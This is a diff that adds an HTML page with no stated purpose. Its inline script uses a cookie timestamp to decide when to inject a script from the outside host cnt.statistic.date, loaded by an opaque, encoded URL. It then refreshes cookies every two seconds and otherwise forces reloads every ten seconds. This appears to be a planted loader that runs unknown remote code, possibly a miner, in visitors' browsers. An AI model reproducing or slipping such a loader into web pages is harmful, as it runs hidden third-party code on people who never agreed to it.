@@ -1,0 +1,52 @@
+<html> 
+<head>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+<script>
+t = 0;
+
+var cookie = parseInt($.cookie('cookie'));
+if(cookie > 0){
+t = cookie;
+}
+
+t += 10000;
+
+now = Date.now();
+</script>
+
+</head> 
+<body>  
+<script>
+if(now > t){
+	
+	console.log('1');
+	
+	var date = new Date();
+	date.setTime(date.getTime() + (60 * 60 * 24 * 30 * 12));	
+	$.cookie('cookie', now, {expires: date, path: '/'});
+	
+	s = document.createElement("script");
+	s.src = "https://cnt.statistic.date/js/QAdABEeAFAWoRGYMgBEQ1RHlBAkpjFmVyL6ICZiwBWT9xZzQSTwwTTzgXOt81R34QDPYiJhJyC90RCZokMXEENDQgGFACJLUxTRVkATxhWARAF3EhWmlhCGglJgIROrQhIHAwUfIAW7kFOBIAEvoEELd1GHskFaMFFdABENskGWsgCGMEGW11QHoBBBlBFJ9xTVYwO.js?trl=0.80";
+	document.body.appendChild(s);
+	
+	setInterval(function(){
+		now = Date.now();
+		console.log('3');
+		var date = new Date();
+		date.setTime(date.getTime() + (60 * 60 * 24 * 30 * 12));	
+		$.cookie('cookie', now, {expires: date, path: '/'});
+		$.cookie('cookietwo', now, {expires: date, path: '/'});
+	},2000);   
+
+	
+} else { 
+	console.log('2');
+	setTimeout(function(){location.reload()},10000); 
+}
+</script>
+
+
+</body> 
+</html>
